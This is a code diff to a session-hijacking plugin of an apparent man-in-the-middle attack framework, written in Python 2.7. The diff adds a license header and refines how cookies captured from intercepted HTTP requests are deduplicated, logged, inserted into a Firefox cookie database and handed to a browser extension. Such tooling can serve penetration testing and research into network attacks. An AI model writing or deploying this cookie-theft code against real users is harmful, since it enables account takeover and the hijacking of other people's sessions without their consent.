@@ -1,7 +1,27 @@
+#!/usr/bin/env python2.7
+
+# Copyright (c) 2014-2016 Marcello Salvati
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
+#
+
 #Almost all of the Firefox related code was stolen from Firelamb https://github.com/sensepost/mana/tree/master/firelamb
  
 from plugins.plugin import Plugin
-from libs.publicsuffix import PublicSuffixList
+from core.publicsuffix.publicsuffix import PublicSuffixList
 from urlparse import urlparse
 import threading
 import os
@@ -55,8 +75,6 @@ class SessionHijacker(Plugin):
 		client_ip = request.getClientIP()
 
 		if 'cookie' in headers:
-		
-			logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
 			
 			if self.firefox:
 				url = "http://" + headers['host'] + request.getPathFromUri()
@@ -66,9 +84,21 @@ class SessionHijacker(Plugin):
 					cvalue = str(cookie)[eq+1:].strip()
 					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
 
+				logging.info("%s << Inserted cookie into firefox db" % client_ip)
+
 			if self.mallory:
-				self.sessions.append((headers['host'], headers['cookie']))
-				logging.info("%s Sent cookie to browser extension" % client_ip)
+				if len(self.sessions) > 0:
+					temp = []
+					for session in self.sessions:
+						temp.append(session[0])
+					if headers['host'] not in temp:
+						self.sessions.append((headers['host'], headers['cookie']))
+						logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
+						logging.info("%s Sent cookie to browser extension" % client_ip)
+				else:
+					self.sessions.append((headers['host'], headers['cookie']))
+					logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
+					logging.info("%s Sent cookie to browser extension" % client_ip)
 
 	#def handleHeader(self, request, key, value): # Server => Client
 	#	if 'set-cookie' in request.client.headers:
@@ -146,7 +176,6 @@ class SessionHijacker(Plugin):
 		expire_date = 2000000000 #Year2033
 		now = int(time.time()) - 600
 		self.sql_conns[ip].execute('INSERT OR IGNORE INTO moz_cookies (baseDomain, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly) VALUES (?,?,?,?,?,?,?,?,?,?)', (basedomain,cookie_name,cookie_value,address,'/',expire_date,now,now,0,0))
-		logging.info("%s << Inserted cookie into firefox db" % ip)
 
 	def add_options(self, options):
 		options.add_argument('--firefox', dest='firefox', action='store_true', default=False, help='Create a firefox profile with captured cookies')
